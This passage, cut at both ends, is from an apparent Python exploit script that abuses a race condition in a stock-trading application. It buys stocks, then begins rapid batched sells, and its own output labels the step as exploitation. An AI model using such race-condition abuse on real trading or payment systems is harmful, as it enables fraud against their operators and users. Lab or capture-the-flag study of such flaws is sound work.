            # Buy at least one of each target stock
            for stock in target_stocks:
                buy_stock(stock)
            return False

        # Execute rapid buy/sell operations
        print(f"[*] Exploiting race condition with stocks: {', '.join(owned_stocks)}")

        # First do a batch of sells to get money
        for stock in owned_stocks:
            for _ in range(20):
